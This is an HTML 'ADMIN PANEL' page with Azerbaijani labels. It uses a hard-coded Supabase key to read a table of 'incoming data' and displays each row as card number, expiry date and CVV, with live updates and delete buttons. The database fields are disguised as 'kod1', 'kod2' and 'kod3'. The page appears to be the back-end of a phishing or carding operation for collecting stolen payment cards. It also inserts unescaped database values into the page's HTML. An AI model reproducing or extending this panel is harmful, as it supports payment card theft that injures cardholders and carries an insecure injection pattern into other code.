<!DOCTYPE html>
<html lang="az">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ADMIN PANEL</title>

<style>
body{
  font-family:Arial;
  background:#111;
  color:white;
  padding:20px;
}

h2{
  margin-bottom:20px;
}

.card{
  background:#1e1e1e;
  padding:15px;
  margin-bottom:15px;
  border-radius:12px;
}

button{
  margin-top:10px;
  padding:8px 12px;
  border:none;
  border-radius:8px;
  background:red;
  color:white;
  cursor:pointer;
}
</style>
</head>
<body>

<h2>Gələn Məlumatlar</h2>
<div id="list"></div>

<script type="module">
import { createClient } from "https://esm.sh/@supabase/supabase-js@2"

const supabaseUrl = "https://gkrfcoyleewxrxbfdunq.supabase.co"
const supabaseKey = "sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH"
const supabase = createClient(supabaseUrl, supabaseKey)

const list = document.getElementById("list")

async function loadData(){
  list.innerHTML="Yüklənir..."

  const { data, error } = await supabase
    .from("mesajlar")
    .select("*")
    .order("id",{ascending:false})

  if(error){
    list.innerHTML="Xəta: "+error.message
    return
  }

  list.innerHTML=""

  data.forEach(item=>{
    const div=document.createElement("div")
    div.className="card"

    div.innerHTML=`
      <b>Kart:</b> ${item.kod1}<br>
      <b>Tarix:</b> ${item.kod2}<br>
      <b>CVV:</b> ${item.kod3}<br>
      <button onclick="deleteItem(${item.id})">Sil</button>
    `

    list.appendChild(div)
  })
}

window.deleteItem = async function(id){
  await supabase
    .from("mesajlar")
    .delete()
    .eq("id",id)

  loadData()
}

loadData()

// realtime
supabase
  .channel('realtime')
  .on('postgres_changes',
    { event: '*', schema: 'public', table: 'mesajlar' },
    () => loadData()
  )
  .subscribe()

</script>

</body>
</html>
